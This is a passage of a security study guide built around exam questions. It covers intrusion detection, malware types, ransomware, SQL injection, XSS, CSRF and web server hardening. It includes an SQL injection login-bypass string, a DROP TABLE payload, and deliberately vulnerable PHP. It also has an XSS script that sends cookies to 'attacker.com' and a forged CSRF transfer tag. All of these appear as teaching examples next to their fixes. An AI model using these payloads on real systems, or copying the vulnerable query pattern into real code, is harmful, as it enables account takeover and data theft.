| Method | How it works | Detects unknown attacks? |
|---|---|---|
| **Signature-based** | Compares traffic against a database of known attack patterns | ❌ **No** — like an antivirus, it misses zero-days |
| **Anomaly-based** | Builds a baseline of "normal" and flags deviations | ✅ **Yes** — but produces more **false positives** |
| **Stateful protocol analysis** | Compares behaviour against expected protocol usage | ✅ Partly |
| **Hybrid** | Combines the above | ✅ Best practice |

#### Types by placement

| Type | Monitors |
|---|---|
| **NIDS/NIPS** (Network-based) | Traffic on a network segment |
| **HIDS/HIPS** (Host-based) | A single host's files, logs, processes and registry |

#### IDS strategy for a high-security environment

> *"As a cybersecurity analyst at a nuclear power plant, what IDS strategies and steps are required?"* — the same reasoning applies to a bank's core network or a national data centre.

```mermaid
flowchart TD
    A["1 . ASSET IDENTIFICATION<br/>map every system, especially the OT/SCADA network"] --> B["2 . NETWORK SEGMENTATION<br/>strictly separate IT from OT (Purdue model);<br/>use a DATA DIODE for one-way flow"]
    B --> C["3 . DEPLOY SENSORS<br/>NIDS at every segment boundary,<br/>HIDS on every critical server and controller"]
    C --> D["4 . BASELINE NORMAL BEHAVIOUR<br/>an industrial control network is highly predictable —<br/>anomaly detection works exceptionally well here"]
    D --> E["5 . TUNE the rules<br/>add protocol-specific signatures (Modbus, DNP3, IEC-104)<br/>and eliminate false positives"]
    E --> F["6 . CENTRALISE into a SIEM<br/>correlate IDS, firewall, host and physical-access logs"]
    F --> G["7 . 24×7 SOC MONITORING<br/>with a defined escalation path"]
    G --> H["8 . INCIDENT RESPONSE PLAN<br/>documented, rehearsed, with safety interlocks<br/>that a cyber incident cannot override"]
    H --> I["9 . CONTINUOUS REVIEW<br/>threat intelligence, red-team exercises, audits"]
```

**The critical points for a safety-critical plant:**
1. **Never place an IPS in-line on the safety/control network.** An IPS false positive that blocks a control command could cause a physical accident. **Use a passive IDS on OT networks**, and an IPS only on the corporate IT side.
2. **Air-gap or data-diode** the control network from the corporate network wherever possible.
3. **Anomaly detection is unusually effective in OT**, because industrial traffic is repetitive and deterministic — any new protocol, new device or unusual command stands out immediately.
4. Monitor for the specific hallmarks of **Stuxnet-class attacks**: unauthorised PLC programming, firmware changes, and USB device insertion.
5. **Physical security and USB control** — Stuxnet entered an air-gapped plant on a USB stick.
6. **Defence in depth**: firewalls, IDS, whitelisting, MFA, strict change control and vetted staff.

#### Defence in depth

**Defence in depth** is the principle of layering **multiple independent security controls**, so that the failure of any one does not compromise the whole system.

```mermaid
flowchart TD
    L1["1 . POLICIES, PROCEDURES & AWARENESS"] --> L2["2 . PHYSICAL SECURITY<br/>locks, guards, CCTV, mantrap"]
    L2 --> L3["3 . PERIMETER<br/>firewall, DMZ, IPS, anti-DDoS"]
    L3 --> L4["4 . NETWORK<br/>segmentation, VLANs, NAC, encryption"]
    L4 --> L5["5 . HOST<br/>patching, hardening, antivirus/EDR, host firewall"]
    L5 --> L6["6 . APPLICATION<br/>secure coding, WAF, input validation"]
    L6 --> L7["7 . DATA<br/>encryption at rest, DLP, backup, access control"]
```

**Previous Year Question List from this Topic:**

- [As a cybersecurity analyst at a nuclear power plant, what IDS strategies and steps are required to prevent cyberattacks?](../written-answers/computer-network-security.md?plain=1#L1864)
- [Let you procure a microfinance application and host it in your office's data centre. What kind of cyber-security threats should you be aware of and what steps w…](../written-answers/computer-network-security.md?plain=1#L250)


---

## Malware & Security Threats

### Malware — Types and Characteristics

**Malware** (**MAL**icious soft**WARE**) is any software **deliberately designed to damage, disrupt, steal from, or gain unauthorised access to** a computer system, network or user.

```mermaid
flowchart TD
    M["MALWARE"]
    M --> A["Virus"]
    M --> B["Worm"]
    M --> C["Trojan Horse"]
    M --> D["Ransomware"]
    M --> E["Spyware / Keylogger"]
    M --> F["Adware"]
    M --> G["Rootkit / Bootkit"]
    M --> H["Botnet / Bot"]
    M --> I["Logic Bomb"]
    M --> J["Backdoor"]
    M --> K["Cryptojacker"]
```

#### The main types

| Type | Definition | Key characteristic |
|---|---|---|
| **Virus** | Malicious code that **attaches itself to a host file or program** and spreads when that file is executed | **Needs a host file AND human action** to spread |
| **Worm** | **Standalone** malware that **self-replicates and spreads across networks automatically** | **No host file, NO human action needed** |
| **Trojan Horse** | Malware **disguised as legitimate, useful software** | **Does NOT self-replicate**; relies on the user installing it |
| **Ransomware** | **Encrypts the victim's files** and demands a ransom for the decryption key | Extortion; often spreads like a worm |
| **Spyware** | Secretly **monitors and reports** the user's activity | Stealth and surveillance |
| **Keylogger** | Records **every keystroke** | Captures passwords and card numbers |
| **Adware** | Displays unwanted advertisements | Often bundled with free software |
| **Rootkit** | Gains and hides **administrator/root-level** access | **Hides itself and other malware** from the OS and antivirus |
| **Bootkit** | A rootkit that infects the **boot sector / MBR / UEFI** | Loads **BEFORE the operating system**, so the OS cannot detect it |
| **Bot / Botnet** | Infected machines under an attacker's remote control | Used for **DDoS**, spam and mining |
| **Logic bomb** | Dormant code that triggers on a **condition** (a date, an employee's name being removed from payroll) | Often planted by an **insider** |
| **Backdoor** | A hidden way to bypass authentication | Gives persistent access |
| **Cryptojacker** | Secretly mines cryptocurrency using the victim's hardware | Steals **electricity and CPU**, not data |
| **Fileless malware** | Lives only in **memory** and uses legitimate tools (PowerShell, WMI) | Leaves **no file** for antivirus to scan |

#### Virus vs Worm vs Trojan — the key comparison

| Point | **Virus** | **Worm** | **Trojan Horse** |
|---|---|---|---|
| **Self-replicating?** | ✅ **Yes** | ✅ **Yes** | ❌ **NO** |
| **Needs a host file?** | ✅ **Yes** — it attaches to a program or document | ❌ **No** — it is standalone | ❌ No — it *is* the program |
| **Needs human action to spread?** | ✅ **Yes** — someone must run the infected file | ❌ **NO** — it spreads by itself | ✅ **Yes** — the user must install it |
| **How it spreads** | Infected files, USB drives, email attachments, downloads | **Network vulnerabilities**, email address books, open shares — automatically | **Deception** — disguised as a game, crack, utility or update |
| **Speed of spread** | Slow to moderate | **Extremely fast** — can span the globe in hours | Slow — one victim at a time |
| **Primary damage** | Corrupts or deletes files, corrupts the host program | **Consumes bandwidth and resources**, crashes networks; often carries a payload | **Opens a backdoor**, steals data, installs other malware |
| **Detection** | Antivirus signature on the infected file | Traffic anomaly, mass scanning behaviour | Behaviour analysis; it looks legitimate |
| **Analogy** | A **biological virus** — needs a host cell | A **parasite that moves on its own** | The **wooden horse of Troy** — a gift that hides soldiers |
| **Example** | Melissa, CIH/Chernobyl, ILOVEYOU (a worm/virus hybrid) | **Morris Worm, Code Red, SQL Slammer, Conficker, WannaCry, Stuxnet** | Zeus banking trojan, Emotet, fake antivirus, a pirated-software "crack" |

> ### "What is a Trojan Horse?"
> A **Trojan horse** is malware that **disguises itself as a legitimate or desirable program** to persuade the user to install it, and then performs malicious actions in the background.
>
> **Its one defining characteristic: a Trojan does NOT self-replicate.** Unlike a virus or worm, it cannot spread on its own — it depends entirely on **deceiving the user** into running it. That is precisely what makes it a *Trojan horse*: the danger is carried in voluntarily, through the front gate.
>
> **Common disguises:** a free game, a "cracked" or "activated" version of paid software, a fake antivirus or system optimiser, a fake Flash/codec update, a pirated movie's "player", or a malicious email attachment.
>
> **Types:** **Backdoor Trojan** (remote access — a RAT), **Banking Trojan** (steals credentials, e.g. Zeus), **Downloader** (fetches more malware), **Rootkit Trojan**, **DDoS Trojan**, **Ransom Trojan**, **Fake AV Trojan**.

#### Components of a computer virus

A virus generally has **three functional parts**:

| Component | Function |
|---|---|
| **1. Infection mechanism** (the **infection vector**) | The code that **finds new hosts and attaches** a copy of the virus to them — this is what makes it a *virus* |
| **2. Trigger** (the **logic bomb**) | The **condition** that decides *when* the payload fires — a date (Friday the 13th), a number of executions, or a specific user action |
| **3. Payload** | **What it actually does** — delete files, corrupt data, display a message, steal information, open a backdoor. The payload may be destructive or merely annoying |

*(A fourth part, the **concealment/stealth mechanism** — encryption, polymorphism, anti-debugging — is present in most modern viruses.)*

#### The four phases of a virus's life

```mermaid
flowchart LR
    A["1 . DORMANT phase<br/>idle, waiting for the trigger"] --> B["2 . PROPAGATION phase<br/>copies itself into other files/systems"]
    B --> C["3 . TRIGGERING phase<br/>the activating condition is met"]
    C --> D["4 . EXECUTION phase<br/>the payload runs"]
```

#### Ransomware

**Ransomware** encrypts the victim's files (or locks the entire system) and **demands a ransom payment — usually in cryptocurrency — for the decryption key**.

**How an attack unfolds:**
1. **Infection** — via a phishing attachment, an exploited RDP/VPN service, a drive-by download, or a software-supply-chain compromise.
2. **Reconnaissance and lateral movement** — the attacker quietly maps the network and escalates privileges over days or weeks.
3. **Exfiltration** — modern ransomware **steals a copy of the data first** (double extortion).
4. **Backup destruction** — shadow copies and reachable backups are deleted.
5. **Encryption** — files are encrypted, usually with AES for speed and RSA to protect the AES key.
6. **Ransom note** — a demand with a countdown timer.
7. **Extortion** — pay, or the data is published (**double extortion**) or customers are contacted (**triple extortion**).

**Famous examples:** **WannaCry (2017)** — a ransomware **worm** that used the EternalBlue SMB exploit to infect 230,000 computers in 150 countries in a day, including the UK's NHS · **NotPetya**, **Locky**, **Ryuk**, **LockBit**, **REvil**.

**Prevention and response**

| Measure | Detail |
|---|---|
| **Backups — the single most important control** | Follow the **3-2-1 rule** and keep at least one copy **offline/immutable**, because networked backups get encrypted too. **Test the restores.** |
| **Patch promptly** | WannaCry exploited a flaw Microsoft had patched **two months earlier** |
| **Email security & user training** | Most infections start with a phishing attachment |
| **Endpoint Detection and Response (EDR)** | Detects the mass-encryption behaviour and stops it mid-attack |
| **Network segmentation** | Confines the blast radius |
| **Least privilege + MFA** | Limits what compromised credentials can reach |
| **Disable RDP from the Internet**; use a VPN with MFA | RDP is a leading entry point |
| **Application whitelisting** | Prevents unknown executables from running |
| **An incident response plan**, rehearsed | Speed of isolation determines the damage |
| **Do NOT pay the ransom** | There is no guarantee of a key, it funds further crime, and many victims are attacked again |

#### Rootkit and bootkit

A **rootkit** is malware designed to obtain and **maintain privileged ("root") access while actively HIDING its own presence** and that of other malware, by subverting the operating system's own reporting.

| Type | Operates at |
|---|---|
| **User-mode rootkit** | Hooks application-level API calls |
| **Kernel-mode rootkit** | Inside the OS kernel — very powerful, very hard to detect |
| **Bootkit** | The **boot sector, MBR or UEFI firmware** — loads **BEFORE the OS**, so no OS-level tool can see it |
| **Hypervisor rootkit** | Runs the real OS inside a malicious virtual machine |
| **Firmware rootkit** | In BIOS/UEFI or device firmware — **survives a disk wipe and OS reinstall** |

> **A bootkit is a rootkit that infects the boot process.** Because it executes before the operating system and the antivirus, it can disable security software before it ever starts. Removing one usually requires **booting from clean external media**, and a firmware bootkit may require **reflashing the BIOS/UEFI**. **Secure Boot** in UEFI is the principal defence.

#### Other definitions

| Term | Definition |
|---|---|
| **Data exfiltration** | The **unauthorised transfer of data OUT of an organisation** — the "theft" stage of a breach. Carried out over HTTPS, DNS tunnelling, email, cloud storage or USB. Countered by **DLP (Data Loss Prevention)**, egress filtering, encryption and monitoring of outbound volumes |
| **Grayware / PUP** | **Potentially Unwanted Program** — software that is **not strictly malicious** but is unwanted: bundled toolbars, aggressive adware, trackers. *(Software downloaded and installed that is not malicious is a **PUP / grayware / legitimate software**, depending on intent.)* |
| **QR code** | **Quick Response code** — a 2-D barcode holding up to ~4,300 characters. **The security risk (Quishing):** a user cannot read a QR code with their eyes, so a malicious code can silently open a phishing site, trigger a payment or install an app. Attackers **paste fake QR stickers over real ones** on payment counters. *Always check the URL that the code resolves to before acting on it.* |
| **Botnet** | A network of compromised machines ("**zombies**") controlled remotely by a **botmaster** through a **command-and-control (C&C)** channel, used for DDoS, spam, credential stuffing and mining |
| **Spam** | **Unsolicited bulk email** — unwanted messages sent indiscriminately. *(The direct answer to "unsolicited email is called…" is **SPAM** — also known as junk mail.)* |

#### How malware spreads, and how to protect a computer

**Infection vectors:** email attachments and links · infected USB drives · drive-by downloads from compromised websites · pirated/cracked software · unpatched software vulnerabilities · malicious mobile apps · fake updates · network shares · supply-chain compromise of a legitimate update.

**Protection — a complete answer**

| Layer | Measures |
|---|---|
| **Software hygiene** | **Keep the OS and all software patched**; uninstall what you do not use; never install pirated software |
| **Antivirus / EDR** | Reputable, **always updated**, with real-time protection enabled |
| **Firewall** | Both the network firewall and the host firewall enabled |
| **Email and web** | Spam filtering, do not open unexpected attachments, hover before clicking, block risky file types |
| **Removable media** | **Disable autorun**; scan every USB device; restrict USB ports on sensitive machines |
| **Accounts** | Use a **standard (non-administrator) account** for daily work; **strong unique passwords** + a password manager; **MFA** everywhere |
| **Backups** | **3-2-1 rule**, with an offline copy; test the restores |
| **Network** | Segmentation, VPN on public Wi-Fi, DNS filtering, disable unused services and ports |
| **Browser** | Keep it updated, use an ad/script blocker, avoid untrusted sites |
| **Awareness** | **The user is the last line of defence** — training is the highest-return investment |
| **Monitoring & response** | Logging, alerting, and a tested incident-response plan |

**Two antivirus products to name:** **Kaspersky, Norton, Bitdefender, Avast, McAfee, ESET NOD32, Microsoft Defender, Trend Micro, AVG**.

> **Worked scenario — "your computer is infected by a virus and it has also copied itself to six neighbouring computers":** the immediate response is (1) **isolate** — disconnect all seven machines from the network to stop further spread; (2) **identify** the malware with an updated scanner from clean rescue media; (3) **eradicate** — clean or, for anything with rootkit behaviour, **wipe and reinstall**; (4) **restore** data from a known-clean backup; (5) **patch** the vulnerability that allowed the spread and change all passwords; (6) **monitor** for reinfection; and (7) **review** — how did it get in, and what control failed? The fact that it spread to six machines by itself indicates **worm behaviour**, so the network vulnerability, not just the files, must be fixed.

**Previous Year Question List from this Topic:**

- [Differentiate between a Computer Virus and a Computer Worm based on how they spread and replicate across host networks.](../written-answers/computer-network-security.md?plain=1#L2519)
- [What is exfiltration?](../written-answers/computer-network-security.md?plain=1#L2541)
- [Software downloaded from internet and installed that is not malicious is called?](../written-answers/computer-network-security.md?plain=1#L2565)
- [একটি Virus ও Ransomware এর নাম লিখ?](../written-answers/computer-network-security.md?plain=1#L2580)
- [What is Trojan horse virus?](../written-answers/computer-network-security.md?plain=1#L2594)
- [Computer এর Virus কি?](../written-answers/computer-network-security.md?plain=1#L2618)
- [Trojan Horse কি?](../written-answers/computer-network-security.md?plain=1#L2642)
- [What is QR code? What is Rootkit and bootkit?](../written-answers/computer-network-security.md?plain=1#L2660)
- [Suppose your computer system is attack by a VIRUS and it's also copy into the six neighbor computer. Then it encrypts your all data in your all data in your sys…](../written-answers/computer-network-security.md?plain=1#L2686)
- [‘Trojan Horse’ এর একটি বৈশিষ্ট্য লিখুন।](../written-answers/computer-network-security.md?plain=1#L2715)
- [Explain: Worm, Botnet, Ransomware and Trojan horse.](../written-answers/computer-network-security.md?plain=1#L2727)
- [Malware বলতে কী বুঝানো হয়? উদাহরণসহ সংক্ষেপে বর্ণনা করুন।](../written-answers/computer-network-security.md?plain=1#L2759)
- [Define component of computer virus.](../written-answers/computer-network-security.md?plain=1#L2784)
- [দুটি এন্টিভাইরাস সফটওয়্যার এর নাম লিখ।](../written-answers/computer-network-security.md?plain=1#L2810)
- [কম্পিউটার ভাইরাস, ওয়ার্ম এবং ট্রোজান হর্স এর মধ্যে পার্থক্য লিখ।](../written-answers/computer-network-security.md?plain=1#L2829)
- [Write down possible threats to a computer systems and how to provide security?](../written-answers/computer-network-security.md?plain=1#L2854)
- [What protection do you provide for your computer from malware?](../written-answers/computer-network-security.md?plain=1#L2899)
- [Describe five types of malware threats and mention five known countermeasures.](../written-answers/computer-network-security.md?plain=1#L2932)
- [Define ransomware attack.](../written-answers/computer-network-security.md?plain=1#L2977)
- [c) What is a computer virus? Name of the two software that are used to prevent the virus.](../written-answers/computer-network-security.md?plain=1#L3001)
- [Unsoliciated email is called?](../written-answers/computer-network-security.md?plain=1#L5693)


---

## Web Security Vulnerabilities

### SQL Injection

**SQL Injection (SQLi)** is a web-application vulnerability in which an attacker **inserts malicious SQL code into an input field**, causing the application to execute **unintended database commands**.

> **The root cause:** the application **builds its SQL query by concatenating user input directly into the query string**, so the database cannot distinguish between the developer's *code* and the attacker's *data*.

#### How it works

**The vulnerable code:**

```php
$user = $_POST['username'];
$pass = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```

**Normal use:** the user enters `rahim` / `secret123`:
```sql
SELECT * FROM users WHERE username = 'rahim' AND password = 'secret123'
```

**The attack:** the attacker enters `' OR '1'='1' --` as the username:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
```

- `' ` closes the developer's quote.
- `OR '1'='1'` is **always TRUE**, so the WHERE clause matches **every row**.
- `--` comments out the rest of the query, **including the password check**.

> **Result: the attacker logs in as the first user in the table — usually the administrator — without knowing any password.**

```mermaid
flowchart LR
    A["Attacker types<br/>' OR '1'='1' --<br/>into the login form"] --> B["The application CONCATENATES<br/>it into the SQL string"]
    B --> C["The database receives a query whose<br/>WHERE clause is always TRUE"]
    C --> D["❌ Authentication BYPASSED<br/>— logged in as admin"]
```

#### Types of SQL injection

| Type | Description |
|---|---|
| **In-band — Error-based** | Deliberately causes database errors that leak table and column names |
| **In-band — UNION-based** | Uses `UNION SELECT` to append the attacker's own query results to the legitimate output |
| **Blind — Boolean** | The page gives no error, so the attacker asks true/false questions and watches how the page changes |
| **Blind — Time-based** | Uses `SLEEP(5)` and measures the response delay to extract data one bit at a time |
| **Out-of-band** | Makes the database send data to the attacker's server via DNS or HTTP |
| **Second-order** | The payload is stored harmlessly and executes later when another query uses it |

#### What an attacker can achieve

1. **Authentication bypass** — log in as any user without a password.
2. **Data theft** — dump the entire customer, card or password table.
3. **Data modification** — change balances, marks, prices or privileges.
4. **Data destruction** — `'; DROP TABLE users; --`.
5. **Privilege escalation** — make their own account an administrator.
6. **Reading local files** on the database server.
7. **Remote command execution** (e.g. `xp_cmdshell` on SQL Server) — leading to **full server compromise**.
8. **Denial of service** through expensive queries.

#### Prevention of SQL injection — the complete answer

| # | Countermeasure | Explanation |
|---|---|---|
| **1** | **Parameterised queries / Prepared statements** | ⭐ **THE definitive fix.** The SQL structure is sent to the database **first**, and the user data is supplied **separately as a parameter**, so it can **never be interpreted as code** — no matter what it contains |
| **2** | **Stored procedures** (written safely, without dynamic SQL inside) | The query structure is fixed in the database |
| **3** | **Input validation — whitelisting** | Accept only the expected format (a numeric ID must be digits only). **Whitelist** what is allowed; do not merely blacklist bad characters |
| **4** | **Escaping special characters** | A weak, last-resort fallback — **never rely on it alone**; escaping rules differ per database and are easy to get wrong |
| **5** | **Least privilege for the database account** | The web application's DB user should have **SELECT/INSERT/UPDATE only** on the specific tables it needs — **never `DROP`, never `db_owner`, never `sa`/`root`** |
| **6** | **Use an ORM** (Hibernate, Entity Framework, Eloquent, Django ORM) | These parameterise by default, though raw-SQL escape hatches must still be used carefully |
| **7** | **Generic error messages** | Never show SQL errors to the user — they hand the attacker the schema. Log the detail server-side |
| **8** | **Web Application Firewall (WAF)** | Detects and blocks known injection patterns — defence in depth, **not a substitute for fixing the code** |
| **9** | **Regular security testing** | Static analysis (SAST), dynamic scanning (DAST), penetration testing, code review |
| **10** | **Keep the DBMS and libraries patched**, and disable dangerous features | e.g. disable `xp_cmdshell` |

**The secure version of the earlier code:**

```php
// PHP with PDO — parameterised
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$user, $passHash]);
```
```java
// Java JDBC — PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?");
ps.setString(1, user);
ps.setString(2, passHash);
ResultSet rs = ps.executeQuery();
```

> Now, if the attacker enters `' OR '1'='1' --`, the database searches for a user **literally named** `' OR '1'='1' --` — finds nobody — and the login fails. The payload is treated as **data, never as code**.

**Previous Year Question List from this Topic:**

- [Describe the SQL Injection and Cross-Site Scripting (XSS) web security threats and suggest preventive measures for each.](../written-answers/computer-network-security.md?plain=1#L3028)
- [Explain the vulnerability of SQL Injection. How can it be prevented?](../written-answers/computer-network-security.md?plain=1#L3080)
- [What is Cross site script and SQL injection?](../written-answers/computer-network-security.md?plain=1#L3119)
- [What is SQL Injection? How to Prevent against SQL Injection Attacks?](../written-answers/computer-network-security.md?plain=1#L3208)
- [What is SQL Injection attack? How it launched?](../written-answers/computer-network-security.md?plain=1#L3330)
- [Write two differences between SQL Injection and cross site scripting (XSS).](../written-answers/computer-network-security.md?plain=1#L3398)
- [What is SQL injection? How to prevent it?](../written-answers/computer-network-security.md?plain=1#L3423)
- [Write down the counter measure of SQL injection attack.](../written-answers/computer-network-security.md?plain=1#L3487)
- [What is SQL Injection? How can we protect web Application from SQL Injection attack?](../written-answers/computer-network-security.md?plain=1#L3526)
- [What is SQL injection? How many ways to prevent it?](../written-answers/computer-network-security.md?plain=1#L3565)
- [What is DDoS and SQL Injection attack?](../written-answers/computer-network-security.md?plain=1#L678)


---

### Cross-Site Scripting (XSS) and CSRF

#### Cross-Site Scripting (XSS)

**XSS** is a vulnerability that allows an attacker to **inject malicious client-side scripts (usually JavaScript) into a web page that is then viewed by OTHER users**. The victim's browser executes the script **because it appears to come from a trusted site**.

> **The root cause:** the application **displays user-supplied input without properly encoding it**, so the browser interprets the input as **HTML/JavaScript code** rather than as text.

#### The three types of XSS

| Type | Where the payload lives | How it reaches the victim |
|---|---|---|
| **Stored (Persistent) XSS** | **Saved in the server's database** — in a comment, profile, forum post or product review | **Every user who views that page** is attacked. **The most dangerous type** |
| **Reflected (Non-persistent) XSS** | **In the URL / request**, reflected straight back in the response | The victim must be **tricked into clicking a crafted link** |
| **DOM-based XSS** | Entirely **in the client-side JavaScript** — the payload never reaches the server | The page's own script writes untrusted data into the DOM |

#### A worked example

A comment box saves whatever the user types and displays it to everyone. The attacker posts:

```html
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
```

**What happens:** every subsequent visitor's browser **executes that script** in the context of the trusted site, and **sends their session cookie to the attacker**, who can then hijack their session.

```mermaid
flowchart TD
    A["1 . Attacker posts a comment containing<br/>&lt;script&gt;steal(document.cookie)&lt;/script&gt;"] --> B["2 . The server SAVES it without encoding"]
    B --> C["3 . A victim opens the page"]
    C --> D["4 . The server sends the script<br/>as part of the trusted page"]
    D --> E["5 . The victim's browser EXECUTES it —<br/>it trusts the site's own domain"]
    E --> F["6 . 🕵️ The session cookie is sent<br/>to the attacker's server"]
    F --> G["7 . The attacker HIJACKS the session<br/>and acts as the victim"]
```

#### What XSS allows

Session cookie theft and **session hijacking** · **keylogging** the victim's typing · defacing the page · redirecting to a phishing site · performing **actions as the victim** (transfer money, change the email address) · installing a **browser-based keylogger or crypto-miner** · stealing data displayed on the page · **bypassing CSRF protection** (a script on the page can read the anti-CSRF token).

#### Prevention of XSS

| # | Countermeasure | Explanation |
|---|---|---|
| **1** | **Output encoding / escaping — the primary fix** | Encode every piece of untrusted data **for the context in which it is placed**: HTML body (`<` → `&lt;`), HTML attribute, JavaScript, CSS, URL. **Encode on OUTPUT, not on input** |
| **2** | **Input validation (whitelist)** | Accept only the expected characters and format |
| **3** | **Content Security Policy (CSP)** | An HTTP header telling the browser **which script sources are allowed**, blocking inline scripts entirely — the strongest defence-in-depth control |
| **4** | **`HttpOnly` cookie flag** | Makes the session cookie **unreadable by JavaScript**, defeating cookie theft even if XSS succeeds |
| **5** | **`Secure` and `SameSite` cookie flags** | HTTPS-only and cross-site restrictions |
| **6** | **Use a framework's auto-escaping** | React, Angular, Vue, Django and Laravel escape output by default — **do not disable it** (`dangerouslySetInnerHTML`, `\|safe`, `v-html`) |
| **7** | **Sanitise rich HTML with a proven library** | If users must submit HTML, use **DOMPurify** or the OWASP Java HTML Sanitizer — never a hand-written regex |
| **8** | **Avoid dangerous sinks** | `innerHTML`, `document.write`, `eval()`, `setTimeout("string")` |
| **9** | **`X-Content-Type-Options: nosniff`** and correct `Content-Type` headers | Prevents the browser from reinterpreting data as script |
| **10** | **WAF and regular testing** | Defence in depth |

#### Cross-Site Request Forgery (CSRF / XSRF)

**CSRF** is an attack that **tricks an authenticated user's browser into sending an unwanted request to a site where they are already logged in** — performing an action **without the user's knowledge or consent**.

> **The root cause:** the browser **automatically attaches the session cookie to every request** to a domain, regardless of which site triggered the request. The server therefore cannot tell a genuine user action from a forged one.

#### How CSRF works

```mermaid
flowchart TD
    A["1 . The victim logs into bank.com<br/>— the browser holds a valid session cookie"] --> B["2 . WITHOUT logging out, the victim visits<br/>a malicious or compromised site"]
    B --> C["3 . That page silently contains:<br/>&lt;img src='https://bank.com/transfer?to=attacker&amp;amount=100000'&gt;<br/>or an auto-submitting hidden form"]
    C --> D["4 . The browser sends the request to bank.com<br/>AND AUTOMATICALLY INCLUDES the session cookie"]
    D --> E["5 . bank.com sees a valid, authenticated request<br/>and EXECUTES THE TRANSFER"]
    E --> F["❌ Money transferred. The victim<br/>never saw or approved anything"]
```

#### XSS vs CSRF — the key distinction

| Point | **XSS** | **CSRF** |
|---|---|---|
| **What is exploited** | The **user's trust in the WEBSITE** | The **website's trust in the USER** |
| **Attack direction** | Malicious code is **injected into the site** and runs in the victim's browser | A **forged request is sent TO the site** from elsewhere |
| **Requires a script on the target site?** | ✅ Yes | ❌ No |
| **Can the attacker read the response?** | ✅ **Yes** — full access to the page and its data | ❌ **No** — it is a "fire and forget" write action |
| **Victim must be logged in?** | Not necessarily | ✅ **Yes — essential** |
| **Steals data?** | ✅ Yes — cookies, page content, keystrokes | ❌ No — it only **performs actions** |
| **Root cause** | Failure to **encode output** | Failure to **verify the ORIGIN of the request** |
| **Main defence** | **Output encoding + CSP + HttpOnly** | **Anti-CSRF tokens + SameSite cookies** |
| **Relationship** | **XSS defeats CSRF protection** — a script on the page can simply read the anti-CSRF token. So XSS must be fixed first | |

#### Prevention of CSRF

| # | Countermeasure | Explanation |
|---|---|---|
| **1** | **Anti-CSRF tokens (synchroniser tokens)** ⭐ | The server embeds a **random, unpredictable, per-session token in every form**, and rejects any state-changing request without the correct token. The attacker's site **cannot read it** (blocked by the same-origin policy) and cannot guess it |
| **2** | **`SameSite` cookie attribute** | `SameSite=Strict` or `Lax` tells the browser **not to send the cookie on cross-site requests** — a simple and very effective modern defence |
| **3** | **Verify the `Origin` and `Referer` headers** | Reject state-changing requests that did not originate from your own domain |
| **4** | **Use POST (never GET) for state-changing actions** | GET requests can be triggered by a mere `<img>` tag |
| **5** | **Re-authentication / step-up authentication** | Require the password, an **OTP** or a transaction PIN for high-value operations such as a fund transfer |
| **6** | **Short session timeouts** and explicit logout | Shrinks the window of opportunity |
| **7** | **CAPTCHA** on sensitive actions | Ensures a human is present |
| **8** | **Custom request headers for AJAX** | Cross-origin requests cannot set custom headers without a CORS pre-flight |
| **9** | **Fix XSS first** | Any XSS flaw nullifies every CSRF defence |

**Previous Year Question List from this Topic:**

- [Describe the SQL Injection and Cross-Site Scripting (XSS) web security threats and suggest preventive measures for each.](../written-answers/computer-network-security.md?plain=1#L3028)
- [What is Cross site script and SQL injection?](../written-answers/computer-network-security.md?plain=1#L3119)
- [What is CSRF attack?](../written-answers/computer-network-security.md?plain=1#L3146)
- [What is CSRF and XSS?](../written-answers/computer-network-security.md?plain=1#L3180)
- [(b) Explain XSS and CSRF (how do you prevent these attacks).](../written-answers/computer-network-security.md?plain=1#L3251)
- [Write two differences between SQL Injection and cross site scripting (XSS).](../written-answers/computer-network-security.md?plain=1#L3398)
- [What is Cross site script XSS and how can fix it?](../written-answers/computer-network-security.md?plain=1#L3449)
- [(খ) Cross Site Scripting (XSS) বলতে কী বোঝায়? এর হাত থেকে রক্ষা পাওয়ার পদ্ধতিগুলো লিখুন।](../written-answers/computer-network-security.md?plain=1#L3590)


---

### Securing a Web Server and a Web Application

#### The OWASP Top 10 — the standard list of web application risks

| # | Risk | Meaning |
|---|---|---|
| 1 | **Broken Access Control** | Users can reach data or functions they should not (e.g. changing an ID in the URL) |
| 2 | **Cryptographic Failures** | Sensitive data transmitted or stored without proper encryption |
| 3 | **Injection** | **SQL injection**, command injection, LDAP injection, **XSS** |
| 4 | **Insecure Design** | Flaws in the architecture itself, not the code |
| 5 | **Security Misconfiguration** | Default passwords, verbose errors, unnecessary features enabled, open cloud buckets |
| 6 | **Vulnerable and Outdated Components** | Unpatched libraries and frameworks |
| 7 | **Identification and Authentication Failures** | Weak passwords, no MFA, poor session management |
| 8 | **Software and Data Integrity Failures** | Unsigned updates, insecure CI/CD, **supply-chain attacks** |
| 9 | **Security Logging and Monitoring Failures** | Breaches go undetected for months |
| 10 | **Server-Side Request Forgery (SSRF)** | The server is tricked into making requests to internal systems |

#### Steps to secure a web server

**1. Harden the operating system and the server**
- Apply **all security patches** promptly and automate the process.
- **Remove or disable everything unnecessary** — unused services, sample applications, default pages, unused modules and ports.
- Change every **default credential**; delete default accounts.
- Run the web server under a **dedicated low-privilege account**, never as root/Administrator.
- Apply **file-system permissions** carefully; make directories non-writable where possible.
- Enable a **host firewall** and allow only ports 80, 443 and a restricted management port.

**2. Encrypt everything in transit**
- **HTTPS only**, with a valid certificate from a trusted CA.
- Enforce **TLS 1.2/1.3**; disable SSLv2, SSLv3, TLS 1.0/1.1 and weak ciphers.
- **Redirect all HTTP to HTTPS** and enable **HSTS**.
- Use **Perfect Forward Secrecy** cipher suites.

**3. Set security headers**

| Header | Purpose |
|---|---|
| `Strict-Transport-Security` | Forces HTTPS for future visits |
| `Content-Security-Policy` | Blocks unauthorised scripts — the main XSS defence in depth |
| `X-Frame-Options: DENY` | Prevents **clickjacking** via iframes |
| `X-Content-Type-Options: nosniff` | Stops MIME sniffing |
| `Referrer-Policy` | Limits information leakage |
| `Permissions-Policy` | Restricts camera, microphone, geolocation |

**4. Secure the application**
- **Parameterised queries** everywhere (SQL injection).
- **Output encoding** everywhere (XSS).
- **Anti-CSRF tokens** and `SameSite` cookies.
- **Validate all input** on the **server side** (client-side validation is only a convenience).
